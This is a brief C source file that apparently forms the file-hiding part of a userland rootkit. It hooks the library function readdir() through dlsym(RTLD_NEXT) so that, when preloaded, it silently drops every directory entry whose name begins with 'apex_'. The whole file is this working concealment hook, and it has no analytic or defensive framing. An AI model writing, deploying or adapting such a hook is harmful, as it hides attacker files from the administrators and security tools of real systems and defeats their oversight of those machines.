
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>

// Original readdir function pointer
static struct dirent *(*original_readdir)(DIR *);

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    do {
        entry = original_readdir(dirp);
        if (entry && strncmp(entry->d_name, "apex_", 5) == 0) {
            // Found target file, skip it (hide)
            continue;
        }
    } while (entry && strncmp(entry->d_name, "apex_", 5) == 0);

    return entry;
}
